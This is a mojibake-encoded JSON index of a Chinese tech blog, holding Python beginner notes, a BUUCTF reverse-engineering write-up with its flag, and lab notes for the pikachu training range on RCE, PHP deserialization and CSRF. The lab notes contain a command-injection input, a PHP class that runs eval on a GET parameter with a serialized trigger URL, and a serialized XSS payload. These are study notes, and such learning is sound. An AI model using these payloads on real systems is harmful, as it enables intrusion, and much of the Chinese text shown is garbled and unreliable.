ï¼š') if pwd=='8': print('æ­£ç¡®') break else: print('é”™è¯¯') 4ã€continue ç»“æŸå½“å‰å¾ªç¯ï¼Œè¿›å…¥ä¸‹ä¸€å¾ªç¯ã€‚ eg: 1-50ä¹‹é—´5çš„å€æ•°ï¼š 1234for i in range(1,51): if i%5!=0: continue print(i) 5ã€else è¯­å¥ eg: 123456789for i in range(3): pwd=input(\"è¯·è¾“å…¥å¯†ç ï¼š\") if pwd=='8': print('True') break else: print('False')else: print('Sorry,the three times all False') 6ã€åµŒå¥—å¾ªç¯ eg: ä¸‰è¡Œå››åˆ—çš„çŸ©å½¢ 1234for i in range(3): for j in range(1,5): print('*',end='\\t') print() eg: å·¦ä¾§ä¸‰è§’å‹ 1234for i in range(1,10): for j in range(1,i+1): print('*',end='') print() eg: æ‰“å°ä¹˜æ³•è¡¨ 1234for i in range(1,10): for j in range(1,i+1): print(i,'*',j,'=',i*j,end=' ') print() 7ã€äºŒé‡å¾ªç¯ä¸­breakå’Œcontinue eg: 12345for i in range(5): for j in range(1,11): if j%2==0: break print(j) j=1æ—¶ï¼Œbreaké€€å›å¤–å±‚å¾ªç¯ï¼Œæ­¤ååªæ‰§è¡Œå¤–å±‚å¾ªç¯ï¼›æ”¹æˆcontinueåï¼Œå†…å¾ªç¯å°†è·³å› for j in range(1,11) ä¸Š","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"pikachu-RCE","slug":"pikachu-RCE","date":"2022-08-11T14:17:28.967Z","updated":"2022-08-11T14:33:04.867Z","comments":true,"path":"2022/08/11/pikachu-RCE/","link":"","permalink":"https://sinky.top/2022/08/11/pikachu-RCE/","excerpt":"","text":"æ¦‚è¿°RCE (remote command/code execute),å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚ è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´æ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œæ¥å£ã€‚ä¸€èˆ¬ä¼šç»™ç”¨æˆ·ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡ip,æäº¤åä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚æ²¡æœ‰å®‰å…¨æ§åˆ¶çš„è¯ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤æ¶æ„å‘½ä»¤ï¼Œåå°æ‰§è¡Œä¼šæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œåå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ exec \"ping\" pingä¸€ä¸‹æœ¬åœ°è¿”å›æ­£å¸¸ã€‚ è¾“å…¥å‘½ä»¤ï¼š www.baidu.com &amp; ipconfig å‘ç°å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„ipåœ°å€ã€‚ â€œ&amp;â€çš„ä½œç”¨æ˜¯å…ˆæ‰§è¡Œ www.baidu.com æˆ–è€…ï¼š &amp;ã€&amp;&amp;ã€|ã€||ã€ï¼› ç­‰æ‹¼æ¥æ‰§è¡Œå‘½ä»¤ã€‚ exec \"eval\" ä¸çŸ¥é“ä¸ºå•¥è¾“å…¥ä»€ä¹ˆéƒ½æŠ¥é”™ çœ‹äº†ä¸€ä¸‹ç½‘é¡µä»£ç ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹äº†åå°æºä»£ç ï¼š ç”¨æˆ·è¾“å…¥å€¼ç›´æ¥è¢«å¸¦å…¥åˆ°eval()å‡½æ•°ä¸­è¿›è¡Œæ‰§è¡Œï¼Œæ²¡æœ‰ä»»ä½•å®‰å…¨å¤„ç†ã€‚ è¾“å…¥ phpinfo(); è¿”å›æ˜¾ç¤ºäº†phpç³»ç»Ÿä¿¡æ¯ã€‚ evalå‡½æ•°çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå®ƒå…è®¸æ‰§è¡Œä»»æ„ PHP ä»£ç  å®ƒå…è®¸æ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"RCE","slug":"RCE","permalink":"https://sinky.top/tags/RCE/"}]},{"title":"Pythonå­¦ä¹ 1","slug":"pythonå­¦ä¹ 1","date":"2022-08-10T11:57:31.721Z","updated":"2022-09-12T03:48:03.773Z","comments":true,"path":"2022/08/10/pythonå­¦ä¹ 1/","link":"","permalink":"https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/","excerpt":"","text":"è¾“å‡ºå‡½æ•°print()1.å¯è¾“å‡ºæ•°å­—ã€å­—ç¬¦ä¸²ã€è¡¨è¾¾å¼ 123print(520) #520print('HelloWorld') #HelloWorldprint(3+1) #4 2.å°†æ•°æ®è¾“å‡ºæ–‡ä»¶ä¸­ file=fp 123fp=open('D:/text.txt','a+')print('Hello',file=fp)fp.close() a+ è‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™åœ¨æ–‡ä»¶å†…å®¹åè¿½åŠ ï¼Œè¯»å†™ã€‚ 3.ä¸è¿›è¡Œæ¢è¡Œè¾“å‡º print('Hello','world','python') #Hello world python è½¬ä¹‰å­—ç¬¦ \\n - æ¢è¡Œï¼›\\r - å›è½¦ï¼›\\t - æ°´å¹³åˆ¶è¡¨ç¬¦ï¼›\\b - é€€æ ¼ï¼› 12print('hello\\rworld') #world #worldå°†helloè¦†ç›–print('hello\\bworld') #hellworld #\\bé€€æ ¼ï¼Œå°†oé€€æ²¡äº† 2.åŸå­—ç¬¦ï¼Œåœ¨å­—ç¬¦ä¸²å‰åŠ ræˆ–Rï¼Œå¯ä½¿å­—ç¬¦ä¸²å†…è½¬ä¹‰å­—ç¬¦å¤±æ•ˆã€‚ print(r'hello\\nworld') #hello\\nworld æ³¨æ„ï¼šå­—ç¬¦ä¸²æœ€åä¸€ä¸ªå­—ç¬¦ä¸å¯ä¸ºæ–œæ ã€‚ è¿›åˆ¶ï¼Œå­—ç¬¦ç¼–ç ï¼Œæ ‡è¯†ç¬¦ï¼Œä¿ç•™å­—1Byte(å­—èŠ‚)=8bit(ä½) 1KB(åƒå­—èŠ‚)=1024Byte 1MB(å…†å­—èŠ‚)=1024KB 1GB(å‰å­—èŠ‚)=1024MB 1TB(å¤ªå­—èŠ‚)=1024GB æ ‡è¯†ç¬¦ï¼šå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼ˆä¸å¯ä»¥æ•°å­—å¼€å¤´ï¼Œä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼‰ å˜é‡å†…å­˜ä¸­ä¸€ä¸ªå¸¦æ ‡ç­¾çš„ç©ºé—´ 1234name='Lihua'print('æ ‡è¯†',id(name))print('ç±»å‹',type(name))print('å€¼',name) 123æ ‡è¯† 1694477549296ç±»å‹ &lt;class 'str'&gt;å€¼ Lihua å¤šæ¬¡èµ‹å€¼åï¼Œå˜é‡åä¼šæŒ‡å‘æ–°çš„ä½¿ç”¨ã€‚ æ•°æ®ç±»å‹int æ•´å‹ åè¿›åˆ¶ é»˜è®¤çš„è¿›åˆ¶ 0-9 äºŒè¿›åˆ¶ ä»¥0bå¼€å¤´ 0,1 å…«è¿›åˆ¶ ä»¥0oå¼€å¤´ 0-7 åå…­ç¦æ­¢ ä»¥0xå¼€å¤´ 0-9ï¼ŒA-F float æµ®ç‚¹å‹å­˜å‚¨å…·æœ‰ä¸ç²¾ç¡®æ€§ï¼Œå¯å¯¼å…¥æ¨¡å—Decimal 12from decimal import Decimalprint(Decimal('1.1')+Decimal('2.2')) #3.3 str å­—ç¬¦ä¸²ç±»å‹ï¼›bool å¸ƒå°”ç±»å‹å­—ç¬¦ä¸²å¯ç”¨å•å¼•å·ã€åŒå¼•å·ã€ä¸‰å¼•å·æˆ–â€â€â€ â€œâ€â€å®šä¹‰ã€‚ å•å¼•å·åŒå¼•å·å®šä¹‰çš„å­—ç¬¦ä¸²éœ€è¦åœ¨ä¸€è¡Œï¼›ä¸‰å¼•å·å¯å¤šè¡Œï¼› 123str='''äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨python'''print(str) 12äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨python æ•°æ®ç±»å‹è½¬æ¢ str() å…¶ä»–è½¬å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥å¼•å·è½¬ int() å…¶ä»–è½¬æ•´å½¢ï¼Œæ–‡å­—å’Œå°æ•°ä¸èƒ½è½¬ï¼Œæµ®ç‚¹æ•°æŠ¹é›¶å–æ•´ float() å…¶ä»–è½¬æµ®ç‚¹ï¼Œæ–‡å­—ç±»ä¸å¯è½¬ï¼Œæ•´æ•°è½¬æµ®ç‚¹æœ«å°¾åŠ .0 123name='å¼ ä¸‰'age=20print('æˆ‘å«'+name+'ï¼Œä»Šå¹´'+str(age)+'å²') 12345a=10b=98.9c=Falseprint(type(a),type(b),type(c))print(str(a),str(b),str(c),type(str(a)),type(str(b)),type(str(c))) 12&lt;class 'int'&gt; &lt;class 'float'&gt; &lt;class 'bool'&gt;10 98.9 False &lt;class 'str'&gt; &lt;class 'str'&gt; &lt;class 'str'&gt; 12345678910s1=128f1=98.7s2='76.77'ff=Trues3='hello'print(int(s1),type(int(s1))) #128print(int(f1),type(int(f1))) #98 #print(int(s2),type(int(s2))) #Errorprint(int(ff),type(int(ff))) #1 #print(int(s3),type(int(s3))) #Error 123128 &lt;class 'int'&gt;98 &lt;class 'int'&gt;1 &lt;class 'int'&gt; æ³¨é‡Šå•è¡Œï¼š# å¤šè¡Œï¼šä¸‰å¼•å· ä¸­æ–‡ç¼–ç å£°æ˜ï¼š #coding:utf-8 è¾“å…¥å‡½æ•°input()æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œè¿”å›ç±»å‹strï¼Œå­˜å‚¨â€™=â€™ è¿ç®—ç¬¦1.ç®—æœ¯è¿ç®—ç¬¦ åŠ + å‡- ä¹˜* é™¤/ æ•´é™¤// å–ä½™% å¹‚** æ•´é™¤ï¼ˆä¸€æ­£ä¸€è´Ÿå‘ä¸‹å–æ•´ï¼‰ å–ä½™ï¼ˆä½™æ•°=è¢«é™¤æ•°-é™¤æ•°*å•†ï¼‰ 2ã€èµ‹å€¼è¿ç®—ç¬¦ â€˜=â€™ æ‰§è¡Œï¼šä»å³è‡³å·¦ï¼› +=ã€-=ã€*=ã€/=ã€//=ã€%= a,b,c=10,20,30 a+=30 # a=a+30 3.æ¯”è¾ƒè¿ç®—ç¬¦ ç»“æœä¸ºbool ã€&lt;ã€==ã€!=(ä¸ç­‰äº)ã€isã€is not å¸ƒå°”ï¼šand,or,not,in,not in 5.ä½è¿ç®—ç¬¦ ä¸&amp; 11ä¸º1ï¼Œå¦åˆ™ä¸º0 æˆ–| 00ä¸º0ï¼Œå¦åˆ™ä¸º1 å·¦ç§»ä½&lt;&lt; é«˜ä½æº¢å‡ºèˆå¼ƒï¼Œä½ä½è¡¥0 ï¼ˆç›¸å½“äºä¹˜2ï¼‰ å³ç§»ä½&gt;&gt; ä½ä½æº¢å‡ºèˆå¼ƒï¼Œé«˜ä½è¡¥0 ï¼ˆç›¸å½“äºé™¤ä»¥2ï¼‰ 123456print(4&amp;8) # 0print(4|8) # 12print(4&lt;&lt;1) #8print(4&gt;&gt;1) #2print(4&lt;&lt;2) #16print(4&gt;&gt;2) #1 6.ä¼˜å…ˆçº§ ç®—æœ¯&gt;ä½&gt;æ¯”è¾ƒ&gt;å¸ƒå°”&gt;èµ‹å€¼","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"SimpleRev","slug":"SimpleRev-buu-Re","date":"2022-08-10T02:14:24.700Z","updated":"2022-08-10T02:15:05.412Z","comments":true,"path":"2022/08/10/SimpleRev-buu-Re/","link":"","permalink":"https://sinky.top/2022/08/10/SimpleRev-buu-Re/","excerpt":"","text":"IDAæ‰“å¼€æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œç›´æ¥ç‚¹è¿›Congratulationæ‰¾åˆ°å…³é”®å‡½æ•°Decry() æµ…åˆ†æä¸€ä¸‹ Decry()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970{ char *v0; char v2; int v3; signed int v4; signed int i; signed int v6; char src[8]; __int64 v8; int v9; __int64 v10; __int64 v11; int v12; __int64 v13; v13 = *MK_FP(__FS__, 40LL); *(_QWORD *)src = 'SLCDN'; v8 = 0LL; v9 = 0; v10 = 'wodah'; v11 = 0LL; v12 = 0; LODWORD(v0) = join(key3, &amp;v10); // å°ç«¯åºå­˜å‚¨ï¼Œv10è¦å€’è¿‡æ¥çœ‹ï¼štext=killshadow text = v0; strcpy(key, key1); strcat(key, src); // key=ADSFKNDCLS v3 = 0; v4 = 0; getchar(); v6 = strlen(key);// forå¾ªç¯æ˜¯ä¸ºäº†å¤§å†™å˜å°å†™ for ( i = 0; i &lt; v6; ++i ) { if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 ) key[i] = key[v4 % v6] + 32; ++v4; } printf(\"Please input your flag:\", src); while ( 1 ) { v2 = getchar(); if ( v2 == 10 ) break; if ( v2 == 32 ) { ++v3; } else { if ( v2 &lt;= 96 || v2 &gt; 122 ) { if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 ) str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; } else { str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //æ ¸å¿ƒä»£ç  } if ( !(v4 % v6) ) putchar(32); ++v3; } }//ç»è¿‡åŠ å¯†åstr2ä¸textä¸€è‡´å¾—åˆ°Congratulationï¼Œåˆ™åŠ å¯†å‰çš„str2å°±æ˜¯flag if ( !strcmp(text, str2) ) puts(\"Congratulation!\\n\"); else puts(\"Try again!\\n\"); return *MK_FP(__FS__, 40LL) ^ v13;} æœ‰å–ä½™ï¼Œæ²¡æ³•é€†æ¨ï¼Œç”¨çˆ†ç ´ï¼š 1234567891011121314151617181920pyè„šæœ¬ï¼škey=\"ADSFKNDCLS\"text=\"killshadow\"s=\"\"flag=\"\"loop=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"v2 = 0v3 = 0v5 = len(key)for i in range(0,v5): if ( ord(key[i]) &gt; 64 and ord(key[i]) &lt;= 90 ): s += chr(ord(key[i]) + 32) else: s +=key[i]print(s)for i in range(0,len(text)): for j in loop: if ord(text[i])==(ord(j)-39-ord(s[i])+97)%26+97: flag+=jprint(flag) 123456789101112131415161718192021222324 #include&lt;stdio.h&gt; int main(){ char key[] = \"adsfkndcls\"; char text[] = \"killshadow\"; int i; int v3=10;//é•¿åº¦ for (int i = 0; i &lt; 10; i++) { for (int j = 0; j &lt; 128; j++) { if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a') { continue; } if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i]) { printf(\"%c\",j); v3++; break; } } }} flag{KLDQCUDFZO}","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"https://sinky.top/tags/Re/"},{"name":"Buu","slug":"Buu","permalink":"https://sinky.top/tags/Buu/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"}]},{"title":"PHPååºåˆ—åŒ–","slug":"pikachu-PHPååºåˆ—åŒ–","date":"2022-08-09T09:01:18.129Z","updated":"2022-08-11T14:18:28.118Z","comments":true,"path":"2022/08/09/pikachu-PHPååºåˆ—åŒ–/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"æ¦‚è¿°åºåˆ—åŒ– serialize()åºåˆ—åŒ–ï¼šæŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²ã€‚ 123456class S{public $test=\"pikachu\";}$s=new S;//åˆ›å»ºä¸€ä¸ªå¯¹è±¡serialize($s);//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–?&gt; ç»“æœï¼šO:1:â€Sâ€:1:{s:4:â€testâ€;s:7:â€pikachuâ€;} O:ä»£è¡¨object 1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦ S:å¯¹è±¡çš„åç§° 1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡ s:æ•°æ®ç±»å‹ 4:å˜é‡åç§°çš„é•¿åº¦ test:å˜é‡åç§° s:æ•°æ®ç±»å‹ 7:å˜é‡å€¼çš„é•¿åº¦ pikachu:å˜é‡å€¼ ï¼ˆä»€ä¹ˆé¬¼ï¼Œæ²¡æ‡‚ï¼‰ ååºåˆ—åŒ– unserialize()å°±æ˜¯æŠŠåºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡ï¼Œç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚ $u=unserialize(\"0:1:\"S\":1{s:4:\"test\":s:7:\"pikachu\";}\"); echo $u â€&gt; test;//å¾—åˆ°ç»“æœä¸ºpikachu åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ å¸¸è§çš„é­”æ³•å‡½æ•°ï¼š __construct() å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ __destruct() å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ __toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ __wakeuop å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨ å®éªŒ12345678910111213141516171819//å®šä¹‰ç±»class test{//åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶å€™è‡ªåŠ¨è°ƒç”¨destructå‡½æ•°function __destruct(){echo \"&lt;br&gt;__destruct()&lt;br&gt;\";//åœ¨æ­¤å‡½æ•°ä¸­æ·»åŠ eval()ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„eval($_GET['cmd']);}}//echo serialize($test);æ–¹ä¾¿å°†åºåˆ—åŒ–åçš„testå†™è¿›uå‚æ•°ä¸­ä¼ å‚$test = new test;echo serialize($test);//æ‰§è¡Œå®Œè¿™ä¸ªechoåä¼šè¢«åƒåœ¾å›æ”¶å™¨å›æ”¶ï¼Œä¹Ÿå°±æ˜¯é”€æ¯unserialize($_GET['u']);//ååºåˆ—åŒ–æ‰§è¡Œå®Œååˆä¼šè¢«å›æ”¶// æ‰€ä»¥ä¼šå‡ºç°ä¸¤æ¬¡destruct?&gt; ä¼ å‚: http://localhost/phptest.php?O:4:\"test\":0:{}&amp;cmd=system(\"woami\"); åˆ©ç”¨æˆåŠŸã€‚ phpååºåˆ—åŒ–æ¼æ´ éšä¾¿æäº¤ç‚¹å•¥å­—ç¬¦ä¸²ï¼Œæç¤ºâ€œå¤§å…„å¼Ÿï¼Œæ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„â€ æäº¤äº†ä¸€ä¸²åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå›æ˜¾æ˜¯ååºåˆ—åŒ–åçš„ã€‚æ²¡å•¥æ€è·¯ï¼Œçœ‹ä¸€ä¸‹åå°ä»£ç ã€‚ å°†XSSå­—ç¬¦ä¸² &lt;script&gt;alert('xss')&lt;/script&gt; åºåˆ—åŒ–ä¸€ä¸‹ï¼š O:1:\"S\":1:{s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";} æäº¤ï¼ŒæˆåŠŸ","categories":[],"tags":[{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"pikachu-CSRF","slug":"pikachu-CSRF","date":"2022-08-09T08:30:06.517Z","updated":"2022-08-09T08:51:43.331Z","comments":true,"path":"2022/08/09/pikachu-CSRF/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu-CSRF/","excerpt":"","text":"CSRFCSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œåœ¨csrfæ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼Œæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ï¼Œæ‰€ä»¥csrfæ”»å‡»ä¹Ÿæˆä¸ºâ€one clickâ€æ”»å‡». csrfæ”»å‡»æ»¡è¶³çš„æ¡ä»¶1ã€ç½‘ç«™æ²¡æœ‰å¯¹ä¸ªäººçš„ä¿¡æ¯ä¿®æ”¹çš„è¯·æ±‚è¿›è¡Œé˜²csrfå¤„ç†ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€  2.ç”¨æˆ·åœ¨ç™»å½•åå°çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»äº†æ”»å‡»è€…å‘é€çš„é“¾æ¥ï¼Œå¦‚æœç”¨æˆ·æ²¡ç™»é™†æˆ–æ²¡ç‚¹è¿æ¥éƒ½ä¸ä¼šæˆ csrfä¸xssçš„åŒºåˆ«csrfæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€Œxssæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚ å¦‚ä½•ç¡®è®¤ä¸€ä¸ªwebç³»ç»Ÿå­˜åœ¨csrfæ¼æ´1.å¯¹ç›®æ ‡ç½‘ç«™å¢åˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°ï¼Œå¹¶è§‚å¯Ÿå…¶é€»è¾‘ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«ä¼ªé€  ä¿®æ”¹ç®¡ç†å‘˜è´¦å·æ—¶ï¼Œå¹¶ä¸éœ€è¦éªŒè¯æ—§å¯†ç ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ï¼› å¯¹äºæ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å¹¶æ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„tokenéªŒè¯ï¼Œå¯¼è‡´è¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ï¼› 2.ç¡®è®¤å‡­è¯çš„æœ‰æ•ˆæœŸ è™½ç„¶é€€å‡ºæˆ–å…³é—­äº†æµè§ˆå™¨ï¼Œä½†cookieä»ç„¶æœ‰æ•ˆï¼Œæˆ–è€…sessionå¹¶æ²¡æœ‰åŠæ—¶å›½ä¼ï¼Œå¯¼è‡´csrfæ”»å‡»å˜å¾—ç®€å•ã€‚ CSRF(get)ç™»å½•è´¦å·ï¼ŒæŠ“å–ä¿®æ”¹ä¸ªäººä¿¡æ¯æµé‡åŒ…ã€‚ å‘ç°å‚æ•°å¯ä»¥ç›´æ¥è¢«ä¿®æ”¹ï¼Œæœªåšä»»ä½•ç¡®è®¤æœºåˆ¶ï¼Œå¯ä»¥ç›´æ¥å°†urlä¼ªè£…æˆå„ç§htmlè®©å—å®³è€…ç‚¹å‡»ã€‚ å¯ä»¥æ„é€ å‡ºCSRFæ”»å‡»URL,è¯±ä½¿ç™»å½•çŠ¶æ€çš„ç”¨æˆ·ç‚¹å‡»urlå°±å¯ä»¥å®ŒæˆCSRFæ”»å‡»ã€‚ å¦‚æœä¿®æ”¹ä¿¡æ¯çš„è¯·æ±‚æ–¹å¼æ˜¯POSTå‹çš„ï¼Œæ”»å‡»è€…åˆ™ä¸èƒ½é€šè¿‡æ„é€ æ¶æ„urlæ¥æ”»å‡»ã€‚ç±»ä¼¼äºxssçš„postå‹æ”»å‡»ï¼Œæ”»å‡»è€…ä¼šæ„é€ ä¸€ä¸ªè‡ªå·±çš„æ”»å‡»ç«™ç‚¹ï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œç«™ç‚¹ä¸Šæœ‰ä¸€ä¸ªpoat.htmlï¼Œè¯±ä½¿ç”¨æˆ·ç‚¹å‡»è¯¥åœ°å€ã€‚å½“ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å‘å­˜åœ¨CSRFçš„æœåŠ¡å™¨æäº¤POSTè¯·æ±‚ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚ æ­¥éª¤åŒgetã€‚ æ­£å¸¸ç™»å½•çŠ¶æ€ï¼š ç‚¹å‡»æ¶æ„urlåï¼Œç”¨æˆ·ä¿¡æ¯ç›´æ¥è¢«ä¿®æ”¹ CSRF(Token)token: æ¯æ¬¡è¯·æ±‚éƒ½å¢åŠ ä¸€ä¸ªéšæœºç ï¼ˆéœ€è¦å¤Ÿéšæœºï¼Œä¸å®¹æ˜“è¢«ä¼ªé€ ï¼‰ï¼Œåå°æ¯æ¬¡å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯ï¼Œè¿™ä¸ªéšæœºç å°±æ˜¯tokenã€‚ å¦‚å›¾è·å–ä¿®æ”¹ä¿¡æ¯æµé‡åŒ…åå‘ç°å¢åŠ äº†tokenï¼Œæ— æ³•åˆ©ç”¨ã€‚ é˜²èŒƒCSRFæªæ–½ å¢åŠ tokenéªŒè¯ï¼šå¯¹å…³é”®æ“ä½œå¢åŠ tokenå‚æ•°ï¼Œtokenå€¼å¿…é¡»éšæœºï¼Œæ¯æ¬¡éƒ½ä¸ä¸€æ · å®‰å…¨çš„ä¼šè¯ç®¡ç†ï¼ˆé¿å…ä¼šè¯è¢«åˆ©ç”¨ï¼‰ ä¸è¦å†å®¢æˆ·ç«¯ä¿å­˜æ•æ„Ÿä¿¡æ¯ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯ï¼‰ æµ‹è¯•ç›´æ¥å…³é—­ï¼Œé€€å‡ºæ—¶çš„ä¼šè¯è¿‡æœŸæœºåˆ¶ï¼ˆä¸€èˆ¬æ˜¯15-20åˆ†é’Ÿï¼‰ï¼Œæ— æ“ä½œåˆ™è‡ªåŠ¨ç™»å…¥è¶…æ—¶ã€‚ è®¿é—®æ§åˆ¶å®‰å…¨ç®¡ç† æ•æ„Ÿä¿¡æ¯ä¿®æ”¹æ—¶éœ€è¦å¯¹èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯ï¼ˆå¦‚ä¿®æ”¹è´¦å·æ—¶éœ€è¦åˆ¤æ–­æ—§å¯†ç ï¼‰ æ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹å°½é‡ä½¿ç”¨postï¼ˆpostå®‰å…¨æ€§é«˜äºgetï¼‰ 